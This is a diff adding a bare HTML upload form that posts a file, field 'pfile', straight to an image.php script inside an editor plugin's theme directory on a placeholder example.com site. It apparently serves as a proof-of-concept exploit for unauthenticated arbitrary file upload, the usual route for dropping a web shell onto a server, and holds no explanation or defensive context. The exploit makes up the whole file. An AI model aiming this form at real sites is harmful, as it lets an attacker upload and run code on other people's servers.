@@ -1,0 +1,13 @@
+<html>
+<body>
+<center>
+<form
+action="http://www.example.com/plugins/editors/idoeditor/themes/advanced/php/image.php"
+method="post" enctype="multipart/form-data">
+<input type="file" name="pfile">
+<input type="submit" name="Submit" value="Upload">
+</form>
+</center>
+</body>
+</html>
+
